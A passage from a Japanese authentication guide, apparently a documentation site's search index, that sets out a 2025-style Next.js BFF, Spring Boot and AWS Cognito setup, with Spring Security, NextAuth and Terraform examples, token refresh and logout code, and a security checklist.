resourceserver:\n        jwt:\n          issuer-uri: https://cognito-idp.ap-northeast-1.amazonaws.com/${COGNITO_USER_POOL_ID}\n          jwk-set-uri: https://cognito-idp.ap-northeast-1.amazonaws.com/${COGNITO_USER_POOL_ID}/.well-known/jwks.json\n\n// SecurityConfig.java\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf(csrf -&gt; csrf.disable()) // JWT\u4f7f\u7528\u6642\n            .cors(cors -&gt; cors.configurationSource(corsConfigurationSource()))\n            .sessionManagement(session -&gt;\n                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n            .authorizeHttpRequests(auth -&gt; auth\n                .requestMatchers(\"/health\", \"/actuator/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n            .oauth2ResourceServer(oauth2 -&gt; oauth2\n                .jwt(jwt -&gt; jwt\n                    .jwtAuthenticationConverter(jwtAuthenticationConverter())\n                )\n            );\n\n        return http.build();\n    }\n\n    @Bean\n    public JwtAuthenticationConverter jwtAuthenticationConverter() {\n        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();\n\n        // Cognito\u306e\u30b0\u30eb\u30fc\u30d7\u3092\u30ed\u30fc\u30eb\u306b\u5909\u63db\n        JwtGrantedAuthoritiesConverter authoritiesConverter =\n            new JwtGrantedAuthoritiesConverter();\n        authoritiesConverter.setAuthoritiesClaimName(\"cognito:groups\");\n        authoritiesConverter.setAuthorityPrefix(\"ROLE_\");\n\n        converter.setJwtGrantedAuthoritiesConverter(authoritiesConverter);\n        return converter;\n    }\n\n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n        configuration.setAllowedOrigins(\n            Arrays.asList(\n                \"http://localhost:3000\",  // \u958b\u767a\u74b0\u5883\n                \"https://your-app.com\"     // \u672c\u756a\u74b0\u5883\n            )\n        );\n        configuration.setAllowedMethods(Arrays.asList(\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"));\n        configuration.setAllowedHeaders(Arrays.asList(\"*\"));\n        configuration.setAllowCredentials(true);\n\n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", configuration);\n        return source;\n    }\n}\n\n// \u30b3\u30f3\u30c8\u30ed\u30fc\u30e9\u30fc\u3067\u306e\u4f7f\u7528\u4f8b\n@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n\n    @GetMapping(\"/profile\")\n    public ResponseEntity&lt;UserProfile&gt; getProfile(\n        @AuthenticationPrincipal Jwt jwt\n    ) {\n        String userId = jwt.getSubject(); // Cognito User ID\n        String email = jwt.getClaim(\"email\");\n        List&lt;String&gt; groups = jwt.getClaim(\"cognito:groups\");\n\n        UserProfile profile = userService.getProfile(userId);\n        return ResponseEntity.ok(profile);\n    }\n\n    @PreAuthorize(\"hasRole('Admin')\")\n    @GetMapping(\"/admin\")\n    public ResponseEntity&lt;List&lt;User&gt;&gt; getAllUsers() {\n        return ResponseEntity.ok(userService.getAllUsers());\n    }\n}\n</code></pre>"},{"location":"authentication-guide/#2-2025","title":"2. \u30c8\u30fc\u30af\u30f3\u7ba1\u7406\u6226\u7565(2025\u5e74\u7248)","text":"<p>ID\u30c8\u30fc\u30af\u30f3 vs \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 vs \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3</p> \u30c8\u30fc\u30af\u30f3 \u7528\u9014 \u9001\u4fe1\u5148 \u6709\u52b9\u671f\u9650 \u4fdd\u5b58\u5834\u6240(BFF) ID\u30c8\u30fc\u30af\u30f3 \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3001API\u8a8d\u8a3c Spring Boot API 1\u6642\u9593 Next.js\u30b5\u30fc\u30d0\u30fc\u30bb\u30c3\u30b7\u30e7\u30f3 \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 Cognito User Pool API AWS Cognito 1\u6642\u9593 Next.js\u30b5\u30fc\u30d0\u30fc\u30bb\u30c3\u30b7\u30e7\u30f3 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3 \u30c8\u30fc\u30af\u30f3\u66f4\u65b0 AWS Cognito 30\u65e5 Next.js\u30b5\u30fc\u30d0\u30fc\u30bb\u30c3\u30b7\u30e7\u30f3 <p>BFF\u30d1\u30bf\u30fc\u30f3\u306e\u5b9f\u88c5(\u63a8\u5968)</p> <p>Next.js\u3092BFF(Backend for Frontend)\u3068\u3057\u3066\u4f7f\u7528\u3057\u3001\u30c8\u30fc\u30af\u30f3\u3092\u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9\u3067\u7ba1\u7406:</p> <pre><code>// middleware.ts (Next.js 13+)\nimport { withAuth } from \"next-auth/middleware\";\n\nexport default withAuth({\n  callbacks: {\n    authorized({ token }) {\n      return !!token;\n    },\n  },\n});\n\nexport const config = {\n  matcher: [\n    '/dashboard/:path*',\n    '/api/proxy/:path*',\n  ],\n};\n</code></pre> <p>\u30e1\u30ea\u30c3\u30c8:</p> <ul> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u304c\u30d6\u30e9\u30a6\u30b6\u306b\u516c\u958b\u3055\u308c\u306a\u3044(XSS\u5bfe\u7b56)</li> <li>\u2705 CORS\u8a2d\u5b9a\u304c\u30b7\u30f3\u30d7\u30eb(Next.js \u2194 Spring Boot\u306e\u307f)</li> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u3092\u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9\u3067\u5236\u5fa1</li> <li>\u2705 Next.js\u3067\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u30ad\u30e3\u30c3\u30b7\u30e5\u53ef\u80fd</li> <li>\u2705 \u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u554f\u984c\u3092\u56de\u907f(2025\u5e74\u306e\u5fc5\u9808\u5bfe\u5fdc)</li> <li>\u2705 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3\u3092\u5b89\u5168\u306b\u5b9f\u88c5\u53ef\u80fd</li> </ul> <p>\u30bb\u30c3\u30b7\u30e7\u30f3 vs JWT\u6226\u7565:</p> <pre><code>// NextAuth\u8a2d\u5b9a\nsession: {\n  strategy: 'jwt',  // \u63a8\u5968: \u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\u3001\u30b9\u30b1\u30fc\u30e9\u30d6\u30eb\n  // strategy: 'database',  // \u4ee3\u66ff: \u3088\u308a\u53b3\u683c\u306a\u7ba1\u7406\u304c\u5fc5\u8981\u306a\u5834\u5408\n  maxAge: 30 * 24 * 60 * 60, // 30\u65e5\n}\n</code></pre>"},{"location":"authentication-guide/#3-aws-cognito2025","title":"3. AWS Cognito\u8a2d\u5b9a\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9(2025\u5e74\u7248)","text":"<p>\u30e6\u30fc\u30b6\u30fc\u30d7\u30fc\u30eb\u8a2d\u5b9a</p> <pre><code># Terraform\u4f8b\nresource \"aws_cognito_user_pool\" \"main\" {\n  name = \"your-app-user-pool\"\n\n  # \u30d1\u30b9\u30ef\u30fc\u30c9\u30dd\u30ea\u30b7\u30fc(NIST 800-63B\u6e96\u62e0)\n  password_policy {\n    minimum_length    = 12  # \u6700\u5c0f12\u6587\u5b57\u63a8\u5968(2025\u5e74)\n    require_lowercase = true\n    require_uppercase = true\n    require_numbers   = true\n    require_symbols   = true\n    temporary_password_validity_days = 1\n  }\n\n  # MFA\u8a2d\u5b9a\n  mfa_configuration = \"OPTIONAL\"  # \"ON\"\u3067\u5fc5\u9808\u5316\u3082\u53ef\u80fd\n\n  software_token_mfa_configuration {\n    enabled = true  # TOTP(Google Authenticator\u7b49)\n  }\n\n  # WebAuthn/\u30d1\u30b9\u30ad\u30fc\u5bfe\u5fdc(2024\u5e74\u4ee5\u964d\u5bfe\u5fdc)\n  # user_pool_add_ons {\n  #   advanced_security_mode = \"ENFORCED\"  # \u3053\u308c\u3067\u6709\u52b9\u5316\n  # }\n\n  # \u30a2\u30ab\u30a6\u30f3\u30c8\u56de\u5fa9\n  account_recovery_setting {\n    recovery_mechanism {\n      name     = \"verified_email\"\n      priority = 1\n    }\n    # recovery_mechanism {\n    #   name     = \"verified_phone_number\"  # \u30aa\u30d7\u30b7\u30e7\u30f3\n    #   priority = 2\n    # }\n  }\n\n  # \u5c5e\u6027\u691c\u8a3c\n  auto_verified_attributes = [\"email\"]\n\n  # \u30e1\u30fc\u30eb\u8a2d\u5b9a(SES\u3092\u4f7f\u7528\u63a8\u5968 - \u9001\u4fe1\u5236\u9650\u56de\u907f)\n  email_configuration {\n    email_sending_account = \"DEVELOPER\"\n    source_arn           = aws_ses_email_identity.main.arn\n    reply_to_email_address = \"noreply@example.com\"\n  }\n\n  # \u30e6\u30fc\u30b6\u30fc\u5c5e\u6027\n  schema {\n    name                = \"email\"\n    attribute_data_type = \"String\"\n    required            = true\n    mutable             = true\n  }\n\n  # Lambda Trigger(\u30ab\u30b9\u30bf\u30de\u30a4\u30ba)\n  lambda_config {\n    pre_authentication       = aws_lambda_function.pre_auth.arn\n    post_authentication      = aws_lambda_function.post_auth.arn\n    pre_token_generation     = aws_lambda_function.pre_token.arn\n    custom_message          = aws_lambda_function.custom_message.arn\n  }\n\n  # \u30c7\u30d0\u30a4\u30b9\u8a18\u61b6(\u4fe1\u983c\u6e08\u307f\u30c7\u30d0\u30a4\u30b9\u7ba1\u7406)\n  device_configuration {\n    challenge_required_on_new_device      = true\n    device_only_remembered_on_user_prompt = true\n  }\n}\n\n# \u30a2\u30d7\u30ea\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u8a2d\u5b9a(2025\u5e74\u7248 - OAuth 2.1\u6e96\u62e0)\nresource \"aws_cognito_user_pool_client\" \"nextjs\" {\n  name         = \"nextjs-client\"\n  user_pool_id = aws_cognito_user_pool.main.id\n\n  # \u274c Implicit\u30d5\u30ed\u30fc\u306f\u4f7f\u7528\u7981\u6b62\n  # \u2705 Authorization Code\u306e\u307f\u8a31\u53ef\n  allowed_oauth_flows                  = [\"code\"]\n  allowed_oauth_flows_user_pool_client = true\n  allowed_oauth_scopes                 = [\"openid\", \"email\", \"profile\", \"aws.cognito.signin.user.admin\"]\n\n  # \u30b3\u30fc\u30eb\u30d0\u30c3\u30afURL(\u53b3\u683c\u306a\u4e00\u81f4\u5fc5\u9808)\n  callback_urls = [\n    \"http://localhost:3000/api/auth/callback/cognito\",  # \u958b\u767a\n    \"https://your-app.com/api/auth/callback/cognito\"    # \u672c\u756a\n  ]\n\n  logout_urls = [\n    \"http://localhost:3000\",\n    \"https://your-app.com\"\n  ]\n\n  # \u30c8\u30fc\u30af\u30f3\u6709\u52b9\u671f\u9650(2025\u5e74\u63a8\u5968)\n  access_token_validity  = 1   # 1\u6642\u9593(\u77ed\u5bff\u547d\u63a8\u5968)\n  id_token_validity      = 1   # 1\u6642\u9593\n  refresh_token_validity = 30  # 30\u65e5\n\n  token_validity_units {\n    access_token  = \"hours\"\n    id_token      = \"hours\"\n    refresh_token = \"days\"\n  }\n\n  # PKCE\u30b5\u30dd\u30fc\u30c8(\u5fc5\u9808)\n  explicit_auth_flows = [\n    \"ALLOW_REFRESH_TOKEN_AUTH\",\n    \"ALLOW_USER_SRP_AUTH\",        # Secure Remote Password\n    # \"ALLOW_CUSTOM_AUTH\"          # \u30ab\u30b9\u30bf\u30e0\u8a8d\u8a3c\u30d5\u30ed\u30fc\u7528\n  ]\n\n  # \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5f37\u5316\n  prevent_user_existence_errors = \"ENABLED\"  # \u30e6\u30fc\u30b6\u30fc\u5217\u6319\u653b\u6483\u5bfe\u7b56\n\n  # \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3(2025\u5e74\u63a8\u5968)\n  enable_token_revocation = true\n\n  # Read/Write\u5c5e\u6027\u306e\u5236\u5fa1\n  read_attributes  = [\"email\", \"email_verified\", \"name\"]\n  write_attributes = [\"name\"]\n}\n\n# \u30c9\u30e1\u30a4\u30f3\u8a2d\u5b9a(\u30ab\u30b9\u30bf\u30e0\u30c9\u30e1\u30a4\u30f3\u63a8\u5968)\nresource \"aws_cognito_user_pool_domain\" \"main\" {\n  domain       = \"auth\"\n  user_pool_id = aws_cognito_user_pool.main.id\n  certificate_arn = aws_acm_certificate.auth.arn  # \u30ab\u30b9\u30bf\u30e0\u30c9\u30e1\u30a4\u30f3\u7528\n}\n</code></pre> <p>\u91cd\u8981\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8a2d\u5b9a(2025\u5e74\u7248)</p> <ol> <li>Advanced Security Features(\u5fc5\u9808)</li> </ol> <pre><code>resource \"aws_cognito_user_pool\" \"main\" {\n  # \u9ad8\u5ea6\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6a5f\u80fd\n  user_pool_add_ons {\n    advanced_security_mode = \"ENFORCED\"  # AUDIT or ENFORCED\n  }\n}\n</code></pre> <p>\u6a5f\u80fd:</p> <ul> <li>\u2705 \u30a2\u30c0\u30d7\u30c6\u30a3\u30d6\u8a8d\u8a3c: \u7570\u5e38\u306a\u30ed\u30b0\u30a4\u30f3\u30d1\u30bf\u30fc\u30f3\u691c\u77e5</li> <li>\u2705 \u6f0f\u6d29\u30d1\u30b9\u30ef\u30fc\u30c9\u691c\u77e5: \u65e2\u77e5\u306e\u6f0f\u6d29\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u30d6\u30ed\u30c3\u30af</li> <li> <p>\u2705 \u30ea\u30b9\u30af\u30d9\u30fc\u30b9MFA: \u30ea\u30b9\u30af\u306b\u5fdc\u3058\u3066\u81ea\u52d5\u3067MFA\u8981\u6c42</p> </li> <li> <p>WAF\u7d71\u5408(\u63a8\u5968)</p> </li> </ul> <pre><code># Cognito Hosted UI\u3092WAF\u3067\u4fdd\u8b77\nresource \"aws_wafv2_web_acl_association\" \"cognito\" {\n  resource_arn = aws_cognito_user_pool.main.arn\n  web_acl_arn  = aws_wafv2_web_acl.main.arn\n}\n</code></pre> <ol> <li>\u30ed\u30b0\u3068\u30e2\u30cb\u30bf\u30ea\u30f3\u30b0</li> </ol> <pre><code># CloudWatch Logs\u3078\u306e\u51fa\u529b\nresource \"aws_cloudwatch_log_group\" \"cognito\" {\n  name              = \"/aws/cognito/${aws_cognito_user_pool.main.name}\"\n  retention_in_days = 30\n}\n</code></pre>"},{"location":"authentication-guide/#4","title":"4. \u30a8\u30e9\u30fc\u30cf\u30f3\u30c9\u30ea\u30f3\u30b0\u3068\u30ed\u30b0\u30a2\u30a6\u30c8","text":"<p>\u30c8\u30fc\u30af\u30f3\u671f\u9650\u5207\u308c\u5bfe\u5fdc</p> <pre><code>// Next.js API Route\n// pages/api/proxy/[...path].js\nexport default async function handler(req, res) {\n  const session = await getServerSession(req, res, authOptions);\n\n  if (!session) {\n    return res.status(401).json({ error: 'Unauthorized' });\n  }\n\n  try {\n    const response = await fetch(apiUrl, {\n      headers: {\n        'Authorization': `Bearer ${session.idToken}`,\n      },\n    });\n\n    if (response.status === 401) {\n      // \u30c8\u30fc\u30af\u30f3\u671f\u9650\u5207\u308c\u3001\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u8a66\u884c\n      const refreshed = await refreshCognitoToken(session.refreshToken);\n\n      if (refreshed) {\n        // \u518d\u8a66\u884c\n        const retryResponse = await fetch(apiUrl, {\n          headers: {\n            'Authorization': `Bearer ${refreshed.idToken}`,\n          },\n        });\n        return res.status(retryResponse.status).json(await retryResponse.json());\n      } else {\n        // \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u5931\u6557\u3001\u518d\u30ed\u30b0\u30a4\u30f3\u5fc5\u8981\n        return res.status(401).json({ error: 'Session expired' });\n      }\n    }\n\n    return res.status(response.status).json(await response.json());\n  } catch (error) {\n    console.error('API Error:', error);\n    return res.status(500).json({ error: 'Internal server error' });\n  }\n}\n</code></pre> <p>\u30b0\u30ed\u30fc\u30d0\u30eb\u30ed\u30b0\u30a2\u30a6\u30c8\u5b9f\u88c5</p> <pre><code>// Cognito\u304b\u3089\u3082\u30ed\u30b0\u30a2\u30a6\u30c8\nimport { signOut } from 'next-auth/react';\n\nconst handleLogout = async () =&gt; {\n  // NextAuth\u30bb\u30c3\u30b7\u30e7\u30f3\u524a\u9664\n  await signOut({\n    callbackUrl: '/login',\n    redirect: true\n  });\n\n  // Cognito Hosted UI\u304b\u3089\u3082\u30ed\u30b0\u30a2\u30a6\u30c8(\u30aa\u30d7\u30b7\u30e7\u30f3)\n  const cognitoDomain = process.env.NEXT_PUBLIC_COGNITO_DOMAIN;\n  const clientId = process.env.NEXT_PUBLIC_COGNITO_CLIENT_ID;\n  const logoutUri = encodeURIComponent(window.location.origin);\n\n  window.location.href =\n    `${cognitoDomain}/logout?client_id=${clientId}&amp;logout_uri=${logoutUri}`;\n};\n</code></pre>"},{"location":"authentication-guide/#5-2025","title":"5. \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30c1\u30a7\u30c3\u30af\u30ea\u30b9\u30c8(2025\u5e74\u7248)","text":"<p>Next.js\u5074</p> <ul> <li> \u74b0\u5883\u5909\u6570\u306e\u9069\u5207\u306a\u7ba1\u7406(.env.local\u3001AWS Secrets Manager)</li> <li> HTTPS\u901a\u4fe1\u306e\u5f37\u5236(\u672c\u756a\u74b0\u5883)</li> <li> Content Security Policy\u8a2d\u5b9a(CSP)</li> <li> PKCE\u6709\u52b9\u5316(\u5fc5\u9808)</li> <li> state \u30d1\u30e9\u30e1\u30fc\u30bf\u3067CSRF\u5bfe\u7b56(\u5fc5\u9808)</li> <li> \u30bb\u30c3\u30b7\u30e7\u30f3\u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u8a2d\u5b9a(\u30a2\u30a4\u30c9\u30eb+\u7d76\u5bfe)</li> <li> BFF\u30d1\u30bf\u30fc\u30f3\u3067\u30c8\u30fc\u30af\u30f3\u3092\u30b5\u30fc\u30d0\u30fc\u5074\u7ba1\u7406</li> <li> Cookie\u5c5e\u6027: HttpOnly, Secure, SameSite=Strict</li> <li> \u4f9d\u5b58\u95a2\u4fc2\u306e\u5b9a\u671f\u66f4\u65b0(npm audit)</li> <li> \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d8\u30c3\u30c0\u30fc: HSTS, X-Frame-Options\u7b49</li> </ul> <p>Spring Boot\u5074</p> <ul> <li> JWT\u30c8\u30fc\u30af\u30f3\u691c\u8a3c\u306e\u5b9f\u88c5(\u7f72\u540d\u3001issuer\u3001audience\u3001exp)</li> <li> CORS\u306e\u9069\u5207\u306a\u8a2d\u5b9a(\u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9\u7981\u6b62\u3001Origin\u30db\u30ef\u30a4\u30c8\u30ea\u30b9\u30c8)</li> <li> \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d8\u30c3\u30c0\u30fc\u306e\u8a2d\u5b9a</li> <li> \u30ed\u30fc\u30eb\u30d9\u30fc\u30b9\u30a2\u30af\u30bb\u30b9\u5236\u5fa1(@PreAuthorize)</li> <li> API\u30ec\u30fc\u30c8\u5236\u9650(Bucket4j\u7b49)</li> <li> \u30ed\u30b0\u30fb\u76e3\u67fb\u8a3c\u8de1\u306e\u8a18\u9332(CloudWatch Logs)</li> <li> \u5165\u529b\u5024\u306e\u30d0\u30ea\u30c7\u30fc\u30b7\u30e7\u30f3\u30fb\u30b5\u30cb\u30bf\u30a4\u30ba</li> <li> SQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u5bfe\u7b56(PreparedStatement)</li> <li> JWKS\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0(\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9)</li> <li> \u4f8b\u5916\u30cf\u30f3\u30c9\u30ea\u30f3\u30b0(\u8a73\u7d30\u60c5\u5831\u306e\u6f0f\u3048\u3044\u9632\u6b62)</li> </ul> <p>AWS Cognito\u5074</p> <ul> <li> \u5f37\u529b\u306a\u30d1\u30b9\u30ef\u30fc\u30c9\u30dd\u30ea\u30b7\u30fc(12\u6587\u5b57\u4ee5\u4e0a)</li> <li> MFA\u6709\u52b9\u5316(TOTP/WebAuthn\u63a8\u5968\u3001SMS\u975e\u63a8\u5968)</li> <li> Advanced Security Features\u6709\u52b9\u5316(ENFORCED)</li> <li> \u9069\u5207\u306a\u30c8\u30fc\u30af\u30f3\u6709\u52b9\u671f\u9650(\u30a2\u30af\u30bb\u30b91\u6642\u9593\u3001\u30ea\u30d5\u30ec\u30c3\u30b7\u30e530\u65e5)</li> <li> Lambda\u30c8\u30ea\u30ac\u30fc\u3067\u306e\u30ab\u30b9\u30bf\u30e0\u691c\u8a3c</li> <li> CloudWatch Logs\u3067\u30e2\u30cb\u30bf\u30ea\u30f3\u30b0</li> <li> WAF\u7d71\u5408(DDoS\u3001\u30dc\u30c3\u30c8\u5bfe\u7b56)</li> <li> \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u53b3\u683c\u4e00\u81f4(\u5b8c\u5168\u4e00\u81f4\u306e\u307f)</li> <li> prevent_user_existence_errors\u6709\u52b9\u5316</li> <li> \u30ab\u30b9\u30bf\u30e0\u30c9\u30e1\u30a4\u30f3\u4f7f\u7528(auth.your-app.com)</li> <li> SES\u7d71\u5408(\u30e1\u30fc\u30eb\u9001\u4fe1\u5236\u9650\u56de\u907f)</li> <li> \u30c7\u30d0\u30a4\u30b9\u8a18\u61b6\u6a5f\u80fd\u306e\u6d3b\u7528</li> </ul> <p>\u904b\u7528\u30fb\u76e3\u8996</p> <ul> <li> \u7570\u5e38\u306a\u30ed\u30b0\u30a4\u30f3\u30d1\u30bf\u30fc\u30f3\u306e\u691c\u77e5\u3068\u30a2\u30e9\u30fc\u30c8</li> <li> \u30a2\u30af\u30c6\u30a3\u30d6\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406\u3068\u5f37\u5236\u30ed\u30b0\u30a2\u30a6\u30c8\u6a5f\u80fd</li> <li> \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u5bfe\u5fdc\u8a08\u753b</li> <li> \u5b9a\u671f\u7684\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u76e3\u67fb</li> <li> \u30da\u30cd\u30c8\u30ec\u30fc\u30b7\u30e7\u30f3\u30c6\u30b9\u30c8\u5b9f\u65bd</li> <li> OWASP Top 10\u5bfe\u7b56\u306e\u78ba\u8a8d</li> <li> GDPR/\u500b\u4eba\u60c5\u5831\u4fdd\u8b77\u6cd5\u5bfe\u5fdc</li> <li> \u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u30fb\u30ea\u30ab\u30d0\u30ea\u30fc\u624b\u9806\u306e\u6574\u5099</li> </ul>"},{"location":"authentication-guide/#6","title":"6. \u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u6700\u9069\u5316","text":"<p>1. \u30c8\u30fc\u30af\u30f3\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0</p> <pre><code>// Spring Boot: JWK Set \u3092\u30ad\u30e3\u30c3\u30b7\u30e5\n@Configuration\npublic class JwtDecoderConfig {\n\n    @Bean\n    public JwtDecoder jwtDecoder() {\n        String jwkSetUri = \"https://cognito-idp.ap-northeast-1.amazonaws.com/\"\n                         + userPoolId + \"/.well-known/jwks.json\";\n\n        NimbusJwtDecoder jwtDecoder = NimbusJwtDecoder\n            .withJwkSetUri(jwkSetUri)\n            .cache(Caffeine.newBuilder()  // \u30ad\u30e3\u30c3\u30b7\u30e5\u8ffd\u52a0\n                .maximumSize(100)\n                .expireAfterWrite(10, TimeUnit.MINUTES)\n                .build())\n            .build();\n\n        return jwtDecoder;\n    }\n}\n</code></pre> <p>2. BFF\u3067\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u30ad\u30e3\u30c3\u30b7\u30e5</p> <pre><code>// Next.js API Route with cache\nexport const config = {\n  runtime: 'edge',\n};\n\nexport default async function handler(req) {\n  const session = await getServerSession(req);\n\n  if (!session) {\n    return new Response('Unauthorized', { status: 401 });\n  }\n\n  // \u30ad\u30e3\u30c3\u30b7\u30e5\u6226\u7565\n  const response = await fetch(apiUrl, {\n    headers: {\n      'Authorization': `Bearer ${session.idToken}`,\n    },\n    next: { revalidate: 60 } // 60\u79d2\u30ad\u30e3\u30c3\u30b7\u30e5\n  });\n\n  return response;\n}\n</code></pre>"},{"location":"authentication-guide/#7","title":"7. \u958b\u767a\u30fb\u30c7\u30d7\u30ed\u30a4\u30d5\u30ed\u30fc","text":"<p>\u74b0\u5883\u5206\u96e2</p> <pre><code># \u958b\u767a\u74b0\u5883\nCOGNITO_USER_POOL_ID=ap-northeast-1_dev\nCOGNITO_CLIENT_ID=dev_client_id\nAPI_BASE_URL=http://localhost:8080\n\n# \u30b9\u30c6\u30fc\u30b8\u30f3\u30b0\u74b0\u5883\nCOGNITO_USER_POOL_ID=ap-northeast-1_stg\nCOGNITO_CLIENT_ID=stg_client_id\nAPI_BASE_URL=https://api-stg.your-app.com\n\n# \u672c\u756a\u74b0\u5883\nCOGNITO_USER_POOL_ID=ap-northeast-1_prod\nCOGNITO_CLIENT_ID=prod_client_id\nAPI_BASE_URL=https://api.your-app.com\n</code></pre> <p>CI/CD\u3067\u306e\u30c7\u30d7\u30ed\u30a4\u4f8b</p> <pre><code># GitHub Actions\nname: Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy-nextjs:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Deploy to Vercel\n        uses: amondnet/vercel-action@v25\n        with:\n          vercel-token: ${{ secrets.VERCEL_TOKEN }}\n          vercel-org-id: ${{ secrets.VERCEL_ORG_ID }}\n          vercel-project-id: ${{ secrets.VERCEL_PROJECT_ID }}\n\n  deploy-spring-boot:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Deploy to AWS ECS\n        # ... ECS deployment steps\n</code></pre>"},{"location":"authentication-guide/#nextjs-spring-boot-cognito-2025","title":"\u307e\u3068\u3081: Next.js + Spring Boot + Cognito \u69cb\u6210\u306e\u30dd\u30a4\u30f3\u30c8(2025\u5e74\u7248)","text":""},{"location":"authentication-guide/#_50","title":"\u2705 \u3053\u306e\u69cb\u6210\u304c\u512a\u308c\u3066\u3044\u308b\u7406\u7531","text":"<ol> <li>2025\u5e74\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9\u6e96\u62e0</li> <li>BFF\u30d1\u30bf\u30fc\u30f3\u306b\u3088\u308b\u30c8\u30fc\u30af\u30f3\u7ba1\u7406(\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u975e\u4f9d\u5b58)</li> <li>Authorization Code + PKCE(OAuth 2.1\u6e96\u62e0)</li> <li>\u30d1\u30b9\u30ad\u30fc/WebAuthn\u5bfe\u5fdc\u53ef\u80fd</li> <li> <p>\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3</p> </li> <li> <p>\u8cac\u52d9\u306e\u5206\u96e2</p> </li> <li>Next.js: UI/UX\u3001BFF\u3001\u30c8\u30fc\u30af\u30f3\u7ba1\u7406</li> <li>Cognito: \u8a8d\u8a3c\u57fa\u76e4\u3001MFA\u3001\u30ea\u30b9\u30af\u30d9\u30fc\u30b9\u8a8d\u8a3c</li> <li> <p>Spring Boot: \u30d3\u30b8\u30cd\u30b9\u30ed\u30b8\u30c3\u30af\u3001\u8a8d\u53ef\u5236\u5fa1</p> </li> <li> <p>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3</p> </li> <li>\u30c8\u30fc\u30af\u30f3\u3092Next.js\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u7ba1\u7406(XSS\u5bfe\u7b56)</li> <li>HttpOnly/Secure/SameSite Cookie(CSRF\u5bfe\u7b56)</li> <li>Cognito\u306b\u3088\u308b\u5805\u7262\u306a\u8a8d\u8a3c(Advanced Security)</li> <li>\u6a19\u6e96\u30d7\u30ed\u30c8\u30b3\u30eb(OAuth 2.0/OIDC)\u6e96\u62e0</li> <li> <p>WAF/CloudWatch\u7d71\u5408\u3067\u9632\u5fa1\u3068\u76e3\u8996</p> </li> <li> <p>\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3</p> </li> <li>\u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\u8a2d\u8a08(JWT\u6226\u7565)</li> <li>\u30de\u30cd\u30fc\u30b8\u30c9\u30b5\u30fc\u30d3\u30b9(Cognito)\u6d3b\u7528</li> <li>\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u5316\u3082\u5bb9\u6613</li> <li> <p>\u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u5bfe\u5fdc</p> </li> <li> <p>\u958b\u767a\u52b9\u7387</p> </li> 